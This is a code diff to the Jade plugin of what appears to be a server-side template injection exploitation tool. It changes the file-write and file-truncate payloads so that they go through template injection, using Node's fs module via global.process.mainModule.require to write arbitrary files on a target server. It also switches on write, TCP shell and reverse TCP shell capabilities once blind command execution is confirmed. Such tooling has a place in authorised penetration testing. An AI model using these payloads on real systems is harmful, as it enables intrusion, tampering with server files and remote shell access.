@@ -16,10 +16,11 @@ class Jade(Plugin):
             'header': '\n= %(header)s\n',
             'trailer': '\n= %(trailer)s\n'
         },
+        # No evaluate_blind here, since we've no sleep, we'll use inject
         'write' : {
-            'call' : 'evaluate',
-            'write' : """global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
-            'truncate' : """global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
+            'call' : 'inject',
+            'write' : """- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
+            'truncate' : """- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
         },
         'read' : {
             'call': 'render',
@@ -101,5 +102,6 @@ class Jade(Plugin):
 
         if self.execute_blind('echo %s' % str(rand.randint_n(2))):
             self.set('execute_blind', True)
+            self.set('write', True)
             self.set('tcp_shell', True)
             self.set('reverse_tcp_shell', True)
